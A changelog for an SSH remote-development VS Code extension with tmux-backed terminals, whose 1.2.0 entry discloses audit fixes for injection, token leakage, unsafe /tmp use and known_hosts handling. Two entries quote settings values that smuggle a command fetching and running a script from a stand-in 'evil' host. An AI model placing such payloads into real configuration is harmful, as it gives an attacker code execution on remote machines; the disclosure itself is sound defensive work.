## 1.2.0

A security and correctness release from a full audit of the codebase. No new features; the
terminal-persistence behaviour is unchanged. Two items change where things are stored on the
remote — see "Upgrade notes" at the end.

**Security**

- **fix: arbitrary code execution on a Windows remote through three settings.** `serverInstallPath`, `serverDownloadUrlTemplate` and `serverBinaryName` were spliced into PowerShell **double-quoted** assignments in the install script with no escaping at all — and `$(…)` inside a double-quoted PowerShell string is evaluated. `remote.SSH.serverInstallPath: {"host": "C:\\srv$(iwr http://evil/x.ps1|iex)"}` ran attacker code on the remote at connect. This was the exact mirror of the bash hazard `escapeCustomInstallPath` was written to close, left unfixed on the Windows side. All values now go through a new `escapePowerShellArg` (single-quoted, embedded quotes doubled) and the template slots are no longer quoted by the script
- **fix: arbitrary code execution on a Unix remote through two more settings.** The earlier hardening pass covered `customInstallPath` and `serverDownloadUrlTemplate` but missed `serverBinaryName` and `defaultExtensions`, which were still interpolated verbatim into double-quoted bash assignments — so `"remote.SSH.serverBinaryName": "code-server$(curl -s http://evil/x|sh)"` executed on connect. Both are now `escapeShellArg`-quoted, extension ids individually
- **fix: the server connection token was written to the output channel on every connect.** `Log.trace` is not level-gated, and both the compiled install script and its stdout carry the token — so copying the "Remote - SSH" output into a bug report published the credential for the remote server. The token is now redacted in all three places, with the surrounding diagnostics kept
- **fix: pasted screenshots were written under world-writable `/tmp`.** The uid in `/tmp/open-remote-ssh-tmux-<uid>/images` was documented as preventing another account from pre-creating the directory or planting a symlink. It did not: a uid is public, so the path was guessable before the victim ever pasted, and `/tmp`'s sticky bit stops deletion, not creation. Pre-creating the directory world-readable defeated `mkdir -p -m 700` entirely (`-m` applies only to directories `mkdir` actually creates — on an existing one it is a silent no-op), and planting a symlink redirected both the writes and the 48h `find … -delete` sweep into a directory of the victim's. Images now live in `~/.cache/open-remote-ssh-tmux/images`, which is not world-writable, and the mode is asserted with an explicit `chmod` rather than assumed
- **fix: a revoked host key was accepted through the ordinary first-connect prompt.** The `known_hosts` parser did not understand OpenSSH marker lines, so `@revoked <host> …` never matched the host — the verdict came back "unknown", the user got the normal "authenticity can't be established" dialog, and accepting recorded the revoked key as trusted. OpenSSH hard-refuses. There is now a `revoked` verdict that refuses with its own message and no override path, deliberately *not* the mismatch wording (which advises deleting the stale entry — here that would mean deleting the revocation and then trusting the revoked key). `@cert-authority` lines no longer count as a host-key match
- **fix: adding a host could corrupt `known_hosts` and lock you out of a host you already trusted.** The new record was appended with no guarantee the file ended in a newline, so on a file whose last line lacked one the two were glued together. The new host then never matched (re-prompt and another glued line on every connect), and — worse — the *previous* entry's key field was corrupted, so that host now read as present-with-a-different-key: verdict `mismatch`, the man-in-the-middle modal, and a refusal with no override, for a host that worked yesterday

**Correctness**

- **fix: `Match` blocks in `~/.ssh/config` were silently ignored, depending on casing.** Directive-name normalization and `Include` expansion both recursed only into `Host` sections, so a `Match host build*` block spelled `hostname`/`user`/`port` in lowercase resolved to nothing and the extension connected to the literal alias, as the local user, on port 22. The identical block spelled `HostName`/`User`/`Port`, or placed under `Host`, worked
- **fix: whitespace-separated `Include` paths were dropped.** OpenSSH separates them with whitespace; the parser split only on commas, so `Include conf.d/*.conf other.conf` was globbed as one literal pattern, matched nothing, and every host in both files vanished with no error. A quoted path containing spaces still resolves
- **fix: `ProxyCommand none` and `ProxyJump none` were not honoured** — `none` is how OpenSSH cancels a proxy inherited from a wildcard block, but it is truthy, so the extension tried to spawn a program called `none` (ENOENT) or resolve a host named `none`
- **fix: a Windows `ProxyCommand` had its backslashes stripped**, turning `C:\Users\me\proxy.exe` into `C:Usersmeproxy.exe` and failing with ENOENT — and the test suite asserted the mangled form as correct, locking the bug in
- **fix: a `remote.SSH.serverInstallPath` containing a space broke the server launch.** The path was correctly escaped into `SERVER_DATA_DIR`, then the flag built from it was expanded *unquoted* one line later, so `/opt/my dir` started the server with `--server-data-dir=/opt/my` plus a stray `dir` positional (and glob-expanded any path containing `*`). The launch flags are bash arrays now, expanded quoted
- **fix: a session name we could not have minted could strand a live tmux session.** `sessionSlot` decoded any `\d+` suffix, so `code-<hash>-007` came back as slot 7 and `code-<hash>-9999999999999999999` as a rounded float — and the terminal provider re-derives the session name *from the slot*, so it attached a brand-new empty session while the real one was left on the remote with nothing pointing at it. The decode now requires the name to round-trip. `isOurSession` — the reaper's kill permit — likewise now admits only names of exactly the shape we mint, instead of `code-a-0` and other near-misses belonging to someone else
- **fix: a failed clipboard read swallowed the user's paste.** The text-clipboard probe sat outside the error handling, so a transient failure (an OLE clipboard lock on Windows, a flaky selection owner on X11/Wayland) escaped the command, skipped the fall-through to an ordinary paste, and showed "Running the contributed command failed" — the one thing the feature promises can't happen
- **fix: image upload failures were invisible.** `exec` reports no exit code, so a `mkdir` that failed was indistinguishable from success and the upload proceeded anyway; and when the remote user probe returned anything unexpected it fell back to a literal `shared` directory — one world-known path for every user on the host, i.e. exactly what the per-user path existed to prevent. The directory creation is now confirmed by an explicit marker, and an unresolvable home refuses the upload instead of guessing
- **fix: the image paste is no longer attempted on a Windows remote**, where every step after the upload is POSIX-only; it degrades to an ordinary text paste, as the tmux layer already does
- **fix: pasted images were never swept unless the tmux layer wired.** Pasting needs only a remote authority, but the 48h cleanup ran inside the tmux gate — so with `remote.SSH.tmux.enabled: "off"`, a remote without tmux, or an empty remote window, images uploaded fine and nothing ever deleted them
- **fix: one failed `globalState` write could leave every command "not found".** `activate()` awaited the remote-folder history write before registering any command or the tree view, so a rejected write rejected activation itself and the window connected into a half-dead extension
- **fix: a blank, undeletable node in "SSH Targets"** — an authority that decoded to an empty hostname was still recorded in the folder history, keyed by `''`, which the tree rendered as a root node that removal (also keyed by that string) could never remove
- **fix: the clipboard webview could freeze for 30 seconds** when `getAsFile()` returned null — the resulting throw meant no message was ever posted and the panel sat on "Got it" until the read timed out

**Leaks and lifetimes**

- **fix: every re-resolve abandoned the previous attempt's resources.** One resolver instance lives for the whole extension lifetime and `resolve()` re-runs on each retry and reconnect, but it never tore down what the last attempt built: the SSH connection and ProxyCommand child were overwritten, the tunnel and proxy-hop lists only grew. A transient install failure followed by a retry left an authenticated connection open, a local forwarding server still listening, a SOCKS server, and an orphaned child process — accumulating across every suspend/resume for the life of the window
- **fix: a ProxyCommand could deadlock the connect with no diagnostic.** Its stderr was piped but never read, so once the proxy wrote ~64KB the pipe filled and the child blocked forever; the connect then hung to `readyTimeout` with nothing to explain it. Verbose proxies (`ssh -v -W`, `cloudflared`) hit this routinely. stderr is now drained into the log
- **fix: a SOCKS connection failure leaked the accepted client socket**, leaving the client hanging forever
- **fix: `execPartial` kept buffering after it had answered.** It resolves as soon as its tester matches but the remote channel stays open, and every later chunk was still appended and re-tested — unbounded growth plus quadratic work for a result already handed to the caller
- **fix: `disposeAll` stranded everything after the first `dispose()` that threw** — leaking precisely the listeners and handles a teardown was called to release, at the moment a collaborator is most likely to be in a bad state. It now releases everything and then reports the failure
- **fix: a partial failure while wiring the tmux layer stacked a duplicate provider.** The terminal open/close listeners were registered before several steps that can throw; a throw made the wiring return "not wired", and the next resolve wired again — leaving two providers allocating slots against the same state and both reacting to every terminal event. The listeners are now handed to the extension's lifetime only once wiring has fully succeeded, and rolled back otherwise
- **fix: an environment variable named after an `Object.prototype` member (`toString`, `valueOf`, …) was never withdrawn** once applied, staying contributed to every terminal for the life of the window

**Tests**

- 110 new unit tests (514 → 624), each written failing-first against the bug it pins. The gaps that let these ship are closed too: there was no `Match`-block test, no test for the PowerShell install script at all (it was not even exported), no `known_hosts` file lacking a trailing newline, no marker lines, no test of the *effective* argv the server is launched with, and no coverage of `disposeAll`

**Upgrade notes**

- Pasted images move from `/tmp/open-remote-ssh-tmux-<uid>/images` to `~/.cache/open-remote-ssh-tmux/images` on the remote. Anything already in the old location is no longer swept by the 48h cleanup; delete it by hand if you want it gone sooner than your system's `/tmp` policy
- A host key recorded in `known_hosts` under an `@revoked` marker is now refused instead of prompted for. If you are relying on such a host, remove the revocation deliberately rather than accepting a key your administrator marked invalid

## 1.1.3
- fix: the 1.1.2 PageUp binding took the key from Claude Code. It passed the key through only on the alternate screen, but an Ink/React TUI — Claude Code, and most others — draws on the *normal* screen, so it looked like a shell prompt. The binding now takes PageUp/PageDown only when the pane's foreground command is a shell *and* the alternate screen is off; everything else (`claude`, `node`, a REPL, vim, htop) keeps both keys. Both arms are needed: a piped pager (`seq 1 500 | less`) still reports `pane_current_command=bash`, so only the alternate-screen test saves it

## 1.1.2
- fix: <kbd>PageUp</kbd> recalled the previous command instead of scrolling. tmux binds nothing to it, so the key reached the shell, where readline's stock `/etc/inputrc` maps it to history-search-backward — the keyboard half of the wheel bug fixed in 1.1.0. PageUp now enters tmux copy mode already paged up, and PageDown pages back down and drops out of it on its own at the bottom, so scrolling never surfaces a tmux mode. A full-screen app on the alternate screen (vim, less, htop) keeps both keys verbatim, and PageDown outside copy mode is swallowed rather than recalling the next command

## 1.1.1
- fix: the clipboard image paste did nothing on Windows and logged nothing about it. Two causes: the command fell through to a plain text paste without a word when it could not determine the remote authority (now it falls back to the resolver's own authority, and says so in the log when there is none), and the PowerShell reader was passed as inline `-Command` text whose `$variables` and quoting had to survive argument processing plus a CreateProcess round trip — both readers now go through `-EncodedCommand` (base64 UTF-16LE), which nothing downstream can reinterpret
- fix: Windows now tries two clipboard readers — WPF `[Windows.Clipboard]::GetImage()` with a `PngBitmapEncoder` first (the combination the long-standing implementations settled on), then WinForms as a second opinion, since the two negotiate clipboard formats differently and a DIB one declines the other can accept
- fix: a reload where VS Code revived *fewer* terminals than there were sessions made the odd one out wait out the full 10s backstop — eleven seconds before the second terminal appeared. Once any revive is observed the wait now ends a short quiet period after the last one, re-armed by each claim, so only a revive that never starts pays the backstop
- fix: folders opened on a host that is not named in the SSH config never appeared in "SSH Targets" — the tree's root nodes came only from `Host` entries while a remembered folder is keyed by the hostname from the remote authority, so connecting by FQDN recorded a folder with no node to hang on. The root list is now the union of both
- fix: the "SSH Targets" view answered from a snapshot taken at activation, so a folder opened in another window never showed up and even its own Refresh command could not surface it — `globalState` is shared across windows and is now read through on every render
- enhance: macOS no longer needs `brew install pngpaste` for the image paste — AppleScript's `the clipboard as «class PNGf»` is used as a built-in fallback, so a stock Mac has a native reader instead of being pushed to the visible webview panel

## 1.1.0
- feat: paste a local screenshot into the focused remote terminal with `Ctrl+Alt+V` (`Cmd+Alt+V` on macOS) — the image is written to the remote and its path pasted, so a remote CLI tool (e.g. Claude Code) can read it; falls through to an ordinary paste when the clipboard holds no image
- feat: `mouse on` so the scroll wheel scrolls the scrollback instead of cycling shell history, with `set-clipboard on` so drag-select still reaches the local clipboard over OSC52
- feat: `remote.SSH.tmux.setDefaultProfile` setting to opt out of the Workspace-scope `terminal.integrated.defaultProfile.<platform>` write that makes a plain "New Terminal" persistent
- fix: the tmux layer never wired at all — the fallback and the real provider both registered on the `tmux` profile id, VS Code throws on the second, and every "Persistent Shell" silently opened a plain shell with no tmux session; registration now has a single owner (`src/tmux/profileRegistration.ts`)
- fix: reopening a window abandoned live work — VS Code keeps a closed window's pty (and the tmux client inside it) alive for its 3h reconnection grace, which reconciliation misread as "another machine holds this"; ownership is now decided by the client-local slot mapping and our own stale client is evicted with tmux `-D` (`src/tmux/slotState.ts`)
- fix: `remote.SSH.tmux.historyLimit` was a complete no-op — tmux reads `history-limit` when a pane is created, before any chained `set-option` can run, so every terminal sat on the 2000-line default; it is now set globally before `new-session` and restored with `-gu` immediately after
- fix: closing a terminal left a running session nothing would ever show again (the "tombstone" behaviour); a user close now kills its session, as in stock open-remote-ssh, while a window close or reload still only detaches
- fix: a window reload could silently disable restore — all four `TerminalExitReason`s were treated as an explicit user close
- fix: split/group terminal layout was discarded on every reload (`isTransient`); restore now queues sessions for VS Code's own revive to claim, so the layout comes from VS Code and the sessions from here
- fix: a reload could still produce duplicate terminals — the restore queue closed on a fixed 2.5s timer, but VS Code revives when the workbench finishes restoring, seconds later on a real remote; the late revive then found an empty queue and minted new sessions, leaving four tabs (two unsplit, two split) where two belonged. The wait now ends on evidence — every queued slot claimed or observed in the window — with a timer only as the backstop for a revive that never comes
- fix: "wants to relaunch the terminal to contribute to its environment" on every reconnect — the `SSH_AUTH_SOCK` contribution is now diffed and skipped when unchanged, since relaunching is precisely what discards a surviving tmux session (`src/common/envCollection.ts`)
- fix: macOS remotes never got the default profile — `terminal.integrated.defaultProfile.<suffix>` is derived from the remote OS instead of hardcoded to `linux`
- fix: three races that could cost a live session — concurrent profile requests taking the same slot, `new-session -A` racing an in-flight `kill-session`, and overlapping `workspaceState` writes
- fix: a dropped channel pruned the slot mapping one slot at a time, because an undeliverable `has-session` probe was read as "session gone"
- fix: one failing `createTerminal` aborted the whole reconcile, discarding mapping state for sessions still alive on the remote
- docs: document the paste-image bridge, the tmux options the layer sets, and the close/detach semantics; drop stale claims about `isTransient` splits and "close = detach, never kill"

## 1.0.0
- feat: fork as open-remote-ssh-tmux — tmux-backed persistent remote terminals that survive client disconnects, window closes, and machine hand-off (PC ↔ laptop ↔ VPS)
- feat: deterministic tmux session naming keyed to host+workspace with attach-or-create semantics — re-opening a workspace re-attaches the same session, never a duplicate
- feat: automatic reaping of empty/dead tmux sessions on connect (`remote.SSH.tmux.reapOnConnect`)
- feat: `remote.SSH.tmux.enabled` setting (`auto` | `on` | `off`) with graceful fallback to plain terminals when tmux is unavailable or on Windows remotes
- feat: `remote.SSH.tmux.historyLimit` setting for remote terminal scrollback
- feat: command to kill all tmux sessions for the current workspace
- build: rebrand to `open-remote-ssh-tmux` / `developerz-ai` publisher identity; SSH transport, `ssh-remote` authority, and command/config ids unchanged from upstream

## 0.2.0
- feat: add compatibility with Code-OSS (#189)
- remodel: use base64 encoding for install script to support csh/tcsh login shells (#296)
- enhance(linux): use `flock` to prevent multiple server install scripts running in parallel (#285)
- enhance: increase polling loop to aid slowish machines (#290)
- refactor: rename `serverBinaryName` setting (#280)
- refactor: extract install scripts from `serverSetup.ts` into script files (#287)

## 0.1.2
- fix: split ProxyCommand into argv tokens before spawn (#274)

## 0.1.1
- don't assume `ProxyCommand` value's type (#270)

## 0.1.0
- replace `which` with `command -v` (#215)
- allow automatic download of remote extension host on FreeBSD (#244)
- add remote.SSH.serverInstallPath option (#259)
- cleanup on errors (#172)
- typo `attemp` -> `attempt` (#185)
- use original ssh-config dependency (#267)

## 0.0.49
- remove default `remote.SSH.serverDownloadUrlTemplate`

## 0.0.48
- Support `%n` in ProxyCommand
- fix: add missing direct @types/ssh2-stream dependency (#177)
- fix Win32 internal error (#178)

## 0.0.47
- Add support for loong64 (#175)
- Add s390x support (#174)
- Support vscodium alpine reh (#142)

## 0.0.46
- Add riscv64 support (#147)

## 0.0.45
- Use windows-x64 server on windows-arm64

## 0.0.44
- Update ssh2 lib
- Properly set extensionHost env variables

## 0.0.43
- Fix parsing multiple include directives

## 0.0.42
- Fix remote label to show port when connecting to a port other than 22

## 0.0.41
- Take into account parsed port from ssh destination. Fixes (#110)

## 0.0.40
- Update ssh-config package

## 0.0.39

- output error messages when downloading vscode server (#39)
- Add PreferredAuthentications support (#97)

## 0.0.38

- Enable remote support for ppc64le (#93)

## 0.0.37

- Default to Current OS User in Connection String if No User Provided (#91)
- Add support for (unofficial) DragonFly reh (#86)

## 0.0.36

- Make wget support continue download (#85)

## 0.0.35

- Fixes hardcoded agentsock for windows breaks pageant compatibility (#81)

## 0.0.34

- Add remote.SSH.connectTimeout setting
- adding %r username replacement to proxycommand (#77)

## 0.0.33

- feat: support %r user substitution in proxycommand

## 0.0.32

- feat: use serverDownloadUrlTemplate from product.json (#59)

## 0.0.31

- feat: support glob patterns in SSH include directives

## 0.0.30

- feat: support file patterns in SSH include directives
